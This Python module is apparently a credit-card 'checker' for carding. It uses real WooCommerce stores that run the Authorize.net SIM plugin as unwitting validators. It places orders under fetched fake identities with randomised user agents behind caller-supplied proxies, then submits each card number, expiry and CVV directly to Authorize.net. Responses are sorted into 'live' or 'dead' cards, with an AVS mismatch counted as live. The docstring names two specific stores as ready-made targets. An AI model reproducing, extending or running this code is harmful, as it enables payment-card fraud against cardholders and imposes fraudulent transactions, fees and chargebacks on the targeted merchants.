"""
wooauth_sim.py — Generic WooCommerce + Authorize.net SIM gateway checker.

Covers any WooCommerce store using the
"authorizenet-payment-gateway-for-woocommerce" plugin (SIM / redirect flow).

Flow
----
1. GET  /?add-to-cart={product_id}
2. GET  /checkout/                      → woocommerce-process-checkout-nonce
3. POST /?wc-ajax=checkout              → order created, returns order-pay URL
4. GET  /checkout/order-pay/{id}/       → pre-signed Auth.net form fields
5. POST https://secure2.authorize.net/gateway/transact.dll
        (all hidden fields + card + x_delim_data=TRUE, x_relay_response=FALSE)
6. Parse pipe-delimited AIM response

Configuration
-------------
Pass a ``SiteConfig`` (or plain dict) to ``check_wooauth_sim``:

    from gateways.wooauth_sim import check_wooauth_sim, SiteConfig

    cfg = SiteConfig(
        base_url    = "https://example.com",
        product_ids = [123, 456],   # at least one; randomly chosen each run
        shop_path   = "/shop/",     # optional, shown as Referer on add-to-cart
    )
    result = check_wooauth_sim(session, card_tuple, cfg)

Pre-built site configs are exported at the bottom of this file:
    ARONICADIFFUSER, ARTBYJODIARIAS
"""

from __future__ import annotations

import random
import re
import time
from dataclasses import dataclass
from typing import List

import requests

from .utils import (
    REQUEST_TIMEOUT,
    build_plain_session,
    convert_year,
    exc_msg,
    fetch_identity,
    random_ua,
)

# ── AIM response keywords ────────────────────────────────────────────────────

_DEAD_KW: List[str] = [
    "declined", "do not honor", "do not honour", "transaction refused",
    "invalid card", "insufficient funds", "card has expired", "expired card",
    "security code", "fraud", "blocked", "invalid account",
    "processor declined", "payment declined", "card declined",
    "authorization failed", "not authorized", "gateway rejected",
    "card number is invalid", "cvv", "pickup card", "stop payment",
]

_LIVE_KW = [
    "Your order has been received. Thank you for your business!",
    "A duplicate transaction has been submitted.",
    "this transaction has been approved",
    "approved",
    "This transaction has been declined because of an AVS mismatch. The address provided does not match the billing address of the cardholder.",
]

_TRANSACT_URL = "https://secure2.authorize.net/gateway/transact.dll"


# ── Site configuration dataclass ─────────────────────────────────────────────

@dataclass
class SiteConfig:
    """Configuration for one WooCommerce + Auth.net SIM store."""
    base_url:    str
    product_ids: List[int]
    shop_path:   str = "/shop/"       # Referer used on the add-to-cart request




# ── Internal helpers ──────────────────────────────────────────────────────────

def _discover_product_id(session: requests.Session, base: str, ua: str) -> int:
    """Crawl the store to find a usable add-to-cart product ID."""
    for path in ["/shop/", "/store/", "/products/", "/"]:
        try:
            r = session.get(
                base + path,
                headers={"User-Agent": ua, "Accept": "text/html,application/xhtml+xml"},
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True,
            )
            ids = re.findall(r'\?add-to-cart=(\d+)', r.text)
            if not ids:
                ids = re.findall(r'data-product_id=["\'](\d+)["\']', r.text)
            if not ids:
                ids = re.findall(r'"product_id"\s*:\s*(\d+)', r.text)
            if ids:
                return int(random.choice(ids))
        except Exception:
            continue
    raise ValueError("product discovery failed: no products found on store")


def _place_order(
    session: requests.Session,
    cfg: SiteConfig,
    identity: dict,
    ua: str,
    product_id: int,
) -> str:
    """Add product to cart, submit checkout, return order-pay URL."""
    base = cfg.base_url.rstrip("/")

    # 1. Add to cart
    session.get(
        f"{base}/?add-to-cart={product_id}",
        headers={
            "User-Agent": ua,
            "Accept":     "text/html,application/xhtml+xml",
            "Referer":    base + cfg.shop_path,
        },
        timeout=REQUEST_TIMEOUT,
    )

    # 2. Checkout nonce
    r = session.get(
        f"{base}/checkout/",
        headers={"User-Agent": ua, "Accept": "text/html,application/xhtml+xml"},
        timeout=REQUEST_TIMEOUT,
    )
    nonces = re.findall(
        r'woocommerce-process-checkout-nonce[^>]*value="([a-f0-9]+)"', r.text
    )
    if not nonces:
        raise ValueError("checkout nonce not found")

    # 3. POST checkout
    data = {
        "billing_first_name": identity["fname"],
        "billing_last_name":  identity["lname"],
        "billing_address_1":  identity["street"],
        "billing_city":       identity["city"],
        "billing_state":      identity.get("state", "CA"),
        "billing_postcode":   identity.get("zip", "90001"),
        "billing_country":    identity.get("country", "US"),
        "billing_email":      identity["email"],
        "billing_phone":      identity["phone"],
        "payment_method":     "authorize",
        "woocommerce-process-checkout-nonce": nonces[0],
        "_wp_http_referer":   "/checkout/",
    }
    r = session.post(
        f"{base}/?wc-ajax=checkout",
        data=data,
        headers={
            "User-Agent":   ua,
            "Accept":       "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer":      f"{base}/checkout/",
            "Origin":       base,
        },
        timeout=REQUEST_TIMEOUT,
    )
    try:
        j = r.json()
    except Exception:
        raise ValueError("checkout response not JSON")

    if j.get("result") != "success":
        msgs = j.get("messages", "")
        text = re.sub(r"<[^>]+>", " ", str(msgs)).strip()
        text = re.sub(r"https?://\S+", "", text, flags=re.IGNORECASE).strip()
        text = re.sub(r"\s{2,}", " ", text).strip()
        raise ValueError(f"checkout failed: {text[:120]}")

    return j["redirect"]


def _get_fingerprint(
    session: requests.Session,
    order_pay_url: str,
    base: str,
    ua: str,
) -> dict:
    """Fetch order-pay page and return all Auth.net hidden input fields."""
    r = session.get(
        order_pay_url,
        headers={
            "User-Agent": ua,
            "Accept":     "text/html,application/xhtml+xml",
            "Referer":    base.rstrip("/") + "/checkout/",
        },
        timeout=REQUEST_TIMEOUT,
    )
    fields: dict = {}
    for tag in re.findall(r"<input[^>]+>", r.text, re.IGNORECASE):
        if not re.search(r"type=[\"']hidden[\"']", tag, re.IGNORECASE):
            continue
        nm  = re.search(r"name=[\"']([^\"']+)[\"']", tag)
        val = re.search(r"value=[\"']([^\"']*)[\"']", tag)
        if nm:
            fields[nm.group(1)] = val.group(1) if val else ""
    if "x_login" not in fields:
        raise ValueError("x_login not found on order-pay page")
    return fields


def _classify(resp_text: str, card_str: str, amount: str) -> dict:
    """Parse pipe-delimited Auth.net AIM response into a result dict."""
    parts = resp_text.strip().split("|")
    code  = parts[0].strip() if parts else "?"
    msg   = parts[3].strip() if len(parts) > 3 else resp_text[:80]
    low   = msg.lower()

    if code == "1" or any(kw in low for kw in _LIVE_KW):
        return {"status": "live",    "message": f"Approved — {msg}", "amount": amount, "card": card_str}
    if code in ("2", "3") or any(kw in low for kw in _DEAD_KW):
        return {"status": "dead",    "message": msg,                  "amount": amount, "card": card_str}
    return     {"status": "unknown", "message": msg[:120],            "amount": amount, "card": card_str}


# ── Public entry point ────────────────────────────────────────────────────────

def check_wooauth_sim(
    session:    requests.Session,
    card_tuple: tuple,
    cfg:        SiteConfig,
    max_retries: int = 3,
) -> dict:
    """Check one card against a WooCommerce + Authorize.net SIM store.

    Args:
        session:     requests.Session (proxy pre-configured by caller).
        card_tuple:  (number, month, year, cvv)
        cfg:         SiteConfig for the target store.
        max_retries: Number of attempts before returning last result.

    Returns:
        {"status": "live"|"dead"|"unknown", "message": str,
         "amount": str, "card": "cc|mm|yy|cvv"}
    """
    cc, mm, yy, cvv = card_tuple
    mm   = mm.zfill(2)
    yy4  = convert_year(yy)
    yy2  = yy4[-2:]
    card_str = f"{cc}|{mm}|{yy4}|{cvv}"
    base     = cfg.base_url.rstrip("/")
    amount   = "varies"

    last_result: dict = {
        "status":  "unknown",
        "message": "No attempts made",
        "amount":  amount,
        "card":    card_str,
    }

    plain = build_plain_session()

    for attempt in range(max_retries):
        try:
            ua         = random_ua()
            identity   = fetch_identity(plain)
            product_id = (
                random.choice(cfg.product_ids) if cfg.product_ids
                else _discover_product_id(session, base, ua)
            )

            # Steps 1-3: place order
            order_pay_url = _place_order(session, cfg, identity, ua, product_id)

            # Step 4: extract fingerprint
            fp     = _get_fingerprint(session, order_pay_url, base, ua)
            amount = f"${fp.get('x_amount', '?')} USD"

            # Step 5: POST to transact.dll
            post_data = dict(fp)
            post_data["x_relay_response"] = "FALSE"
            post_data["x_delim_data"]     = "TRUE"
            post_data["x_delim_char"]     = "|"
            post_data.pop("x_show_form", None)
            post_data["x_card_num"]  = cc
            post_data["x_exp_date"]  = f"{mm}{yy2}"
            post_data["x_card_code"] = cvv

            r = session.post(
                _TRANSACT_URL,
                data=post_data,
                headers={
                    "User-Agent":   ua,
                    "Accept":       "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer":      order_pay_url,
                    "Origin":       base,
                },
                timeout=REQUEST_TIMEOUT,
            )

            # Step 6: classify
            result      = _classify(r.text, card_str, amount)
            last_result = result

            if result["status"] in ("live", "dead"):
                return result

        except Exception as exc:
            last_result = {
                "status":  "unknown",
                "message": exc_msg(exc),
                "amount":  amount,
                "card":    card_str,
            }

        if attempt < max_retries - 1:
            time.sleep(2)

    return last_result
